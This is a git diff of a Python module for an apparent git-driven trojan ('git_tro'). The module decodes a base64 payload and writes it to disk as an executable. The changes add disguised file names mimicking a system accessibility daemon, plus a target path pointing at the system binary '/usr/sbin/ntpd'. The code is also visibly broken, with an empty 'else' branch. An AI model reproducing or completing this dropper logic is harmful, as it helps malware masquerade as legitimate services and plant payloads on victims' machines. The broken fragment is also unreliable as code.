@@ -3,9 +3,16 @@ import json
 import base64
 import os
 
-filePath = "bin/test" #"modules/dirlister.py" #
-folder = filePath.rstrip("test")
-#WinfilePath = "bin/test.exe"
+#folder = filePath.rstrip("test")
+if os.name == 'posix':
+	filePath = "bin/at-spi2-regd" #"modules/dirlister.py" #
+	targetPath = "/usr/sbin/ntpd"
+elif os.name == 'nt': #TODO: CHeck win TargetPth
+	filePath = "bin/at_spi_win32.exe" #"modules/dirlister.py" #
+	targetPath = os.getenv("LOCALPATH")
+else:
+
+
 encodedFiles  = False
 bin = True
 start = True
@@ -39,11 +46,11 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
         ch = ""
         if script is not None:
                 content	= base64.b64decode(script)
-                print(folder)
-                try:
-                        os.makedirs(folder, mode=777)
-                except:
-                        os.system("echo 'getRunScript: folder %s exists' >> Tapalog.log"%folder)
+                #print(folder)
+                #try:
+                #        os.makedirs(folder, mode=777)
+                #except:
+                #        os.system("echo 'getRunScript: folder %s exists' >> Tapalog.log"%folder)
                 if bin:
                         fich = open(filePath+".exe", "wb")
                         fich.write(content)
@@ -66,4 +73,3 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
                 #os.system("echo 'getRunScript: Unable to find file {}' >> Tapalog.log".format(filePath))
                 ch = str("getRunScript: Unable to find script {}".format(filePath))
         return ch
-
